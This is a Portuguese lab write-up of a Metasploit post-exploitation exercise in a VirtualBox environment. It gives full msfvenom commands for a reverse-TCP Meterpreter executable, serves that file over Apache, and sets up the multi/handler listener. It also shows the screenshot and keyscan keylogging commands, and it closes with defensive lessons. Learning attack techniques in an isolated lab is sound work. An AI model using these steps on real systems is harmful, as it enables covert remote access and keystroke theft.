
# 🛡️ Laboratório Prático: Pós-Exploração, Espelhamento e Keylogger com Metasploit

Neste repositório, estou documentando o passo a passo da execução prática do meu laboratório de pós-exploração em cibersegurança ética. Montei um ambiente isolado utilizando o VirtualBox para entender na prática como funcionam a criação de payloads, o estabelecimento de conexões reversas, a captura de tela e o monitoramento de digitação .

---

## 💻 Ambiente que Utilizei
* **Máquina Atacante:** Kali Linux (`192.168.56.102`)[cite: 2]
* **Máquina Vítima:** Windows 7 (em ambiente totalmente controlado para testes)
* **Ferramentas:** Metasploit Framework (`msfvenom`, `multi/handler`, `Meterpreter`) e Servidor Web Apache[cite: 2, 7].

---

## 🛠️ Passo a Passo do que Eu Fiz

### 1. Preparação e Geração do Payload
Primeiro, abri o terminal do meu Kali Linux para verificar o meu IP e gerar o executável malicioso configurado para realizar uma conexão reversa (Reverse-TCP)[cite: 2]:
```bash
hostname -I
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f exe > payload.exe

```

Depois, movi esse payload para a pasta raiz do Apache e iniciei o serviço web para disponibilizar o arquivo para download:

```bash
sudo mv payload.exe /var/www/html/
sudo systemctl start apache2

```

### 2. Entrega e Execução na Vítima

* Na máquina Windows 7, acessei o endereço IP do meu servidor web (`http://192.168.56.102/payload.exe`) pelo navegador e fiz o download e a execução do arquivo `payload.exe` com sucesso.



### 3. Configuração do Listener (Handler) e Conexão

Voltei para o Kali e configurei o receptor no Metasploit para aguardar e capturar a conexão reversa da máquina vítima:

```text
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.56.102
msf exploit(multi/handler) > set LPORT 4444
msf exploit(multi/handler) > exploit

```

*Resultado:* A sessão interativa do **Meterpreter** foi aberta com sucesso (`[*] Meterpreter session 1 opened`).

### 4. Técnicas de Pós-Exploração

* **Espelhamento de Tela:** Usei o comando nativo do Meterpreter para tirar um print em tempo real da tela da vítima:


```text
meterpreter > screenshot

```


(O arquivo `.jpeg` gerado foi salvo no Kali e verificado através do visualizador de imagens).


* **Captura de Teclado (Keylogger):** Ativei a escuta de teclas para monitorar, extrair e encerrar a captura do que foi digitado no sistema comprometido:


```text
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

## 🛡️ Lições Aprendidas e Alertas de Segurança

Fazer esse laboratório me abriu os olhos para a importância de mantermos os sistemas protegidos.
 Aprendi que:

1. **Atualização Constante (Patch Management):** Sistemas operacionais sem suporte e desatualizados (como o Windows 7 que usei no teste) são alvos fáceis porque acumulam vulnerabilidades conhecidas.
2. **Proteção por Antivírus e EDR:** Soluções de segurança modernas ajudam a bloquear a execução de binários desconhecidos e evitam que ameaças rodem livremente na máquina.
3. **Cuidado com Arquivos:** Nunca devemos baixar ou executar arquivos de fontes desconhecidas ou duvidosas, pois a engenharia social e o descuido com downloads são as portas de entrada mais comuns para invasões.

```
